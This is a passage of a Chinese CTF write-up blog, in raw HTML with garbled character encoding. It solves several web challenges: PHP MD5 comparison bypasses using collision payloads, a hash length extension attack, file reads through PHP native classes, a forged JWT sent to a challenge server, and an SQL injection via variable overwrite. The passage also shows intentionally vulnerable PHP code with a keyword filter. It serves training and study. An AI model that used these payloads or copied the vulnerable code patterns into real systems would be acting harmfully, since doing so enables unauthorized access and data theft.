class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if name ends with &#x27;admin&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">5</span>) !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ä¸æ˜¯ç®¡ç†å‘˜ä¹Ÿæ¥å‡‘çƒ­é—¹?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$random</span> . <span class="variable">$name</span>) !== <span class="variable">$md5</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ä¼ªé€ ? NO NO NO!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¤è¾“äº†, çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5</span></span><br><span class="line"><span class="comment">// é‚£ flag å°±ç»™ä½ å§</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¬¬ä¸€ä¸ªåœ°æ–¹ç”¨çš„å¼ºæ¯”è¾ƒ, æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ•°ç»„ç»•è¿‡</li>
<li>ç¬¬äºŒä¸ªåœ°æ–¹å¼ºè½¬æˆäº† string, æ­¤æ—¶æ•°ç»„ä¼šå˜æˆ <code>Array</code> æ— æ³•ç»•è¿‡</li>
</ul>
<p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬äºŒä¸ªåœ°æ–¹çš„å¼±æ¯”è¾ƒ, è®© <code>0e</code> å¼€å¤´çš„å­—ç¬¦ä¸²ä½¿ php è¯¯è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•, ä»è€Œè½¬æ¢ä¸º 0</p>
<ul>
<li>ç¬¬ä¸‰ä¸ªåœ°æ–¹ç¬¬äºŒä¸ªåœ°æ–¹ç”¨äº†å¼ºæ¯”è¾ƒ, æ­¤æ—¶æˆ‘ä»¬éœ€è¦æ‰¾åˆ°çœŸå®çš„ MD5 å€¼ä¸€è‡´çš„å†…å®¹, æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ fastcoll å·¥å…·</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a></p>
<p>é€šè¿‡è°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o a.txt a1.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240829184114078.png" alt="image-20240829184114078"></p>
<p>å¯ä»¥è·å¾—ä¸¤ä¸ªå†…å®¹ä¸åŒä½† MD5 ç›¸åŒçš„å†…å®¹, å°†å…¶å†…å®¹ urlencode ä¹‹åä¼ å…¥</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apple[]=<span class="number">1</span>&amp;banana[]=<span class="number">2</span>&amp;appple=QLTHNDT&amp;bananana=QNKCDZO&amp;apppple=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2&amp;banananana=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure>

<p>ç¬¬å››ä¸ªåœ°æ–¹è€ƒäº† å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»</p>
<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html">https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html</a></p>
<p>å‚è€ƒæ–‡ç« : <a target="_blank" rel="noopener" href="https://luoingly.top/post/md5-length-extension-attack/">https://luoingly.top/post/md5-length-extension-attack/</a></p>
<p>ä½¿ç”¨å·¥å…· <a target="_blank" rel="noopener" href="https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py">https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py</a></p>
<p>æ­¤æ—¶å¯ä»¥æ‹“å±•å‡º admin å°¾ç¼€</p>
<h2 id="Basectf-Week4-flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ"><a href="#Basectf-Week4-flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ" class="headerlink" title="Basectf [Week4] flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ"></a>Basectf [Week4] flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment"># æˆ‘æŠŠflagè—åœ¨ä¸€ä¸ªsecretæ–‡ä»¶å¤¹é‡Œé¢äº†ï¼Œæ‰€ä»¥è¦å­¦ä¼šéå†å•Š~</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$J1ng</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;J&#x27;</span>];</span><br><span class="line"><span class="variable">$Hong</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;H&#x27;</span>];</span><br><span class="line"><span class="variable">$Keng</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;K&#x27;</span>];</span><br><span class="line"><span class="variable">$Wang</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;W&#x27;</span>];</span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="variable">$Keng</span>(<span class="variable">$Wang</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$J1ng</span>(<span class="variable">$Hong</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?K=DirectoryIterator&amp;W=glob:////secret/f11444g.php</span><br><span class="line">J=SplFileObject&amp;H=/secret/f11444g.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?K=DirectoryIterator&amp;W=/secret</span><br><span class="line">J=SplFileObject&amp;H=/secret/f11444g.php</span><br></pre></td></tr></table></figure>

<h1 id="Basectf-Week4-No-JWT"><a href="#Basectf-Week4-No-JWT" class="headerlink" title="Basectf [Week4] No JWT"></a>Basectf [Week4] No JWT</h1><p>è·å–jwt</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_jwt_token</span>(<span class="params">login_url, username, password</span>):</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(login_url, json=login_data)</span><br><span class="line">    token = response.json().get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;JWT Token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login_url = <span class="string">&quot;http://challenge.basectf.fun:48124/login&quot;</span></span><br><span class="line">username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">password = <span class="string">&quot;123&quot;</span></span><br><span class="line">get_jwt_token(login_url, username, password)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240906141821096.png" alt="image-20240906141821096"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">fake_token = <span class="string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyNTYwNjQ4Nn0.lpy4mkxg3OGUh2lOlMR0syCY3Z7bL5lmV1Uo3Q17K30&#x27;</span></span><br><span class="line"></span><br><span class="line">flag_url = <span class="string">&#x27;http://challenge.basectf.fun:48124/flag&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">f&#x27;Bearer <span class="subst">&#123;fake_token&#125;</span>&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(flag_url, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br></pre></td></tr></table></figure>

<h1 id="æµ™æ±Ÿçœç½‘ç»œå®‰å…¨å®£ä¼ æ´²é™…å°å·å¸‚ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ä¸çŸ¥é“ä»€ä¹ˆsqlé¢˜"><a href="#æµ™æ±Ÿçœç½‘ç»œå®‰å…¨å®£ä¼ æ´²é™…å°å·å¸‚ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ä¸çŸ¥é“ä»€ä¹ˆsqlé¢˜" class="headerlink" title="æµ™æ±Ÿçœç½‘ç»œå®‰å…¨å®£ä¼ æ´²é™…å°å·å¸‚ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ä¸çŸ¥é“ä»€ä¹ˆsqlé¢˜"></a>æµ™æ±Ÿçœç½‘ç»œå®‰å…¨å®£ä¼ æ´²é™…å°å·å¸‚ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ä¸çŸ¥é“ä»€ä¹ˆsqlé¢˜</h1><p>è€ƒçš„å˜é‡è¦†ç›–å’Œsqlæ³¨å…¥</p>
<p>æºç </p>
<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace_bad_word</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$limit_words</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$limit_words</span> <span class="keyword">as</span> <span class="variable">$old</span> =&gt; <span class="variable">$new</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">strlen</span>(<span class="variable">$old</span>) &gt; <span class="number">2</span> &amp;&amp; <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$old</span>,<span class="title function_ invoke__">trim</span>(<span class="variable">$new</span>),<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$limit_words</span> = <span class="keyword">array</span>(<span class="string">&#x27;é€ å&#x27;</span> =&gt; <span class="string">&#x27;é€ **&#x27;</span>, <span class="string">&#x27;æ³•è½®åŠŸ&#x27;</span> =&gt; <span class="string">&#x27;æ³•**&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$method</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;è¿æ¥æ•°æ®åº“å¤±è´¥&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT COUNT(*) FROM users&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$row</span>[<span class="string">&#x27;COUNT(*)&#x27;</span>] + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;error);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;msg&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;msg&#x27;</span>] !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">replace_bad_word</span>(<span class="title function_ invoke__">convert</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users VALUES(<span class="subst">$id</span>,&#x27;&quot;</span> . <span class="variable">$msg</span> . <span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;error)</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Welcome come to SEC message board&lt;/center&gt;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;center&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Leave a message: &lt;input type=&quot;text&quot; name=&quot;msg&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;message&lt;/th&gt;&lt;tr&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_row</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;th&gt;<span class="subst">$row</span>[0]&lt;/th&gt;&lt;th&gt;<span class="subst">$row</span>[1]&lt;/th&gt;&lt;tr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å˜é‡è¦†ç›–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$method</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯»å–ä¼ é€’çš„å‚æ•°èµ‹å€¼ç»™keyï¼Œå½“$keyä¸ºsqlçš„æ—¶å€™ï¼Œå°±ç›¸å½“äº$sql&#x3D;xxxxï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†éœ€è¦çš„sqlè¯­å¥æ‹¼æ¥</p>
<p>ç„¶åçœ‹sqlè¯­å¥ï¼Œç”±äº<code>$sql = &quot;SELECT * FROM users&quot;;</code>æ„Ÿè§‰åº”è¯¥ä¸æ˜¯äºŒæ¬¡æ³¨å…¥</p>
<p>insertæ³¨å…¥ä¸æ”¯æŒand whereç­‰ï¼Œä¹Ÿä¸è€ƒè™‘å †å ç­‰ï¼Œæ²¡æœ‰åŸé¢˜ï¼Œæœ¬åœ°ç¯å¢ƒè®¾ç½®ä¸¤åˆ—ï¼Œé‚£ä¹ˆç¬¬äºŒåˆ—ä½¿ç”¨oræ‹¼æ¥</p>
<p>æœ€ç»ˆpayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limit_words[sql]=11&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;&#x27;);#</span><br><span class="line">&amp;msg=sql</span><br></pre></td></tr></table></figure>

<p>![â€”<br>title: â€œweb\U0001F415æ¯æ—¥ä¸€é¢˜â€<br>tags:</p>
<ul>
<li>ctf</li>
<li>web<br>categories:</li>
<li><ul>
<li>ctf</li>
<li>web<br>abbrlink: 10057<br>date: 2024-07-17 15:57:27</li>
</ul>
</li>
</ul>
<hr>
<h1 id="æ¯æ—¥ä¸€é¢˜-1"><a href="#æ¯æ—¥ä¸€é¢˜-1" class="headerlink" title="æ¯æ—¥ä¸€é¢˜"></a>æ¯æ—¥ä¸€é¢˜</h1><blockquote>
<p>æ¯å¤©ä¸€é¢˜ç½¢äº†ã€‚ã€‚</p>
</blockquote>
<h2 id="ctfshowå†…éƒ¨èµ›ç­¾åˆ°-1"><a href="#ctfshowå†…éƒ¨èµ›ç­¾åˆ°-1" class="headerlink" title="ctfshowå†…éƒ¨èµ›ç­¾åˆ°"></a>ctfshowå†…éƒ¨èµ›ç­¾åˆ°</h2><p>æ‰«åˆ°å¤‡ä»½æ–‡ä»¶</p>
<p><strong>login.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/load|and|or|\||\&amp;|select|union|\&#x27;|=| |\\\|,|sleep|ascii/i&quot;</span>,<span class="variable">$arr</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;bad hacker!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">           <span class="keyword">die</span>();   </span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;db.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$e</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> =<span class="string">&quot;select username from test1 where email=&#x27;<span class="subst">$e</span>&#x27; and password=&#x27;<span class="subst">$p</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$e</span>)&amp;&amp;<span class="title function_ invoke__">check</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>)&#123; </span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;u&#x27;</span>]=<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:user.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Wrong username or password&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>register.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span 